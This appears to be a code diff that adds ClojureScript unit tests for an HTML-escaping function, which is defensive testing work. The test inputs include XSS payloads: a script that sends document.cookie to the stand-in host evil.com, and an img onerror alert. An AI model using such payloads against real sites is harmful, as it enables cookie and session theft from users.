@@ -1,5 +1,6 @@
 (ns proxx.http.request-test
   (:require [cljs.test :refer [deftest is testing]]
+            [clojure.string :as str]
             [proxx.http.request :as r]
             [proxx.runtime.http :as edge]))
 
@@ -71,3 +72,39 @@
   (is (= 429 (.-statusCode (edge/queue-error-response-js #js {"data" #js {"code" "queue/full"}}))))
   (is (undefined? (edge/queue-error-response-js #js {"data" #js {"code" "x"}})))
   (is (undefined? (edge/queue-error-response-js #js {}))))
+
+;; ---- ported from src/tests/escape-html.test.ts (13 tests) ----------------
+
+(deftest escape-html-basic-characters
+  (is (= "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;" (r/escape-html "<script>alert('xss')</script>")) "escapes < and >")
+  (is (= "Tom &amp; Jerry" (r/escape-html "Tom & Jerry")) "escapes &")
+  (is (= "She said &quot;hello&quot;" (r/escape-html "She said \"hello\"")) "escapes double quotes")
+  (is (= "O&#39;Brien" (r/escape-html "O'Brien")) "escapes single quotes"))
+
+(deftest escape-html-all-five-characters-together
+  (is (= "&lt;div class=&quot;test&quot; data-name=&#39;a&amp;b&#39;&gt;"
+         (r/escape-html "<div class=\"test\" data-name='a&b'>"))))
+
+(deftest escape-html-no-double-encoding-of-static-strings
+  (is (= "Missing OAuth callback state or code." (r/escape-html "Missing OAuth callback state or code.")))
+  (is (= "&amp;amp;" (r/escape-html "&amp;")) "raw input is encoded exactly once per call"))
+
+(deftest escape-html-legitimate-special-characters
+  (is (= "O&#39;Brien &amp; Associates" (r/escape-html "O'Brien & Associates"))))
+
+(deftest escape-html-edge-cases
+  (is (= "" (r/escape-html "")))
+  (is (= "Hello world 123" (r/escape-html "Hello world 123")))
+  (is (= "&lt;&gt;&amp;&quot;&#39;" (r/escape-html "<>&\"'"))))
+
+(deftest escape-html-neutralizes-xss-payloads
+  (let [result (r/escape-html "<script>document.location=\"http://evil.com/?c=\"+document.cookie</script>")]
+    (is (not (str/includes? result "<script>")) "result must not contain raw <script> tag")
+    (is (not (str/includes? result "</script>")) "result must not contain raw </script> tag")
+    (is (str/includes? result "&lt;script&gt;")))
+  (let [result (r/escape-html "<img onerror=alert(1) src=\"x\">")]
+    (is (not (str/includes? result "<img")) "result must not contain raw <img tag")
+    (is (str/includes? result "&lt;img"))))
+
+(deftest escape-html-edge-export-matches-pure-kernel
+  (is (= (r/escape-html "<a & 'b'>") (edge/escape-html-js "<a & 'b'>"))))
